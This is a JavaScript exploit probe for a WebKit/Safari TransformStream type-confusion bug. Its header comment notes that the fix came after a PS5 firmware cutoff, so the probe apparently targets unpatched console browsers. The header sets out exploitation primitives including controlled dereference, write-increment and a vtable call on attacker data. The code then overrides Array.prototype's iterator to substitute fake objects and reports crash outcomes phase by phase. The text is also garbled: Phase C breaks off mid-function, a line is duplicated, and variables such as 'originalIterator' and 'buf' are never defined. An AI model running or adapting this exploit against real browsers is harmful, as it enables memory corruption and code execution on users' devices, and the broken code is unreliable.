  Fix: commit 8fd92b1, Jun 30, 2026 (Safari 26.5) — WELL AFTER PS5 14.10 cutoff
  
  Bug: createInternalTransformStreamFromTransformer returns a 3-element array.
  C++ iterates it with convert<IDLSequence<IDLObject>> which uses JS iteration protocol.
  If Array.prototype[Symbol.iterator] is overridden, attacker substitutes arbitrary objects
  for readable/writable entries. C++ does dynamicDowncast<JSReadableStream*> and
  dereferences WITHOUT null-check → controlled type confusion.
  
  Primitives:
    - Controlled deref via m_wrapped
    - Write-increment via Ref<>::ref()  
    - vtable call on attacker data when JS touches .readable/.writable
  
  Phase A: Check TransformStream exists
  Phase B: Exact regression test from commit (crash = vulnerable)
  Phase C: Variant 2 — object with heap pointer (survives initial deref)
  Phase D: Variant 3 — truncated iterator
  Phase E: Exploitation probe — try to read .readable/.writable after confusion
  
  CRASH_CLASS: HIGH (type confusion → controlled crash, potential code exec)
-->

flush();

// Save original iterator

// ================================================================
// PHASE B: Variant 1 — plain object substitution (from regression test)

// On patched: TypeError thrown

try{
  Array.prototype[Symbol.iterator]=function(){
    var arr=this,i=0;
    return{next:function(){
      if(i>=arr.length)return{done:true};
      var val=arr[i];
      // The builtin returns a 3-element array: [transform, readable, writable]
      // We substitute indices 1 and 2 (readable/writable) with plain objects
      if(arr.length===3&&i>=1) val={fake:true};
      i++;
      return{value:val,done:false};
    }};
  };
  try{
    new TransformStream();
    emit('B-RESULT','NO-THROW — constructor succeeded (unexpected)');
  }catch(e){
    if(e instanceof TypeError){
      emit('B-RESULT','THREW-TypeError — '+e.message);
    } else {
      emit('B-RESULT','THREW-'+e.name+' — '+e.message);
    }
  }
}catch(e){emit('B-ERR',e.name+':'+e.message);}
Array.prototype[Symbol.iterator]=originalIterator;
flush();

// ================================================================

// Survives initial deref, triggers write-increment / vtable hijack
// On vulnerable: CRASH with controlled data
// On patched: TypeError

emit('C','variant2-heap-pointer');
try{

  Array.prototype[Symbol.iterator]=function(){
    var arr=this,i=0;
    return{next:function(){
      if(i>=arr.length)return{done:true};
      var val=arr[i];
      if(arr.length===3&&i>=1) val={pad:0,ptr:buf};

  Array.prototype[Symbol.iterator]=function(){

emit('DONE','p673-complete');
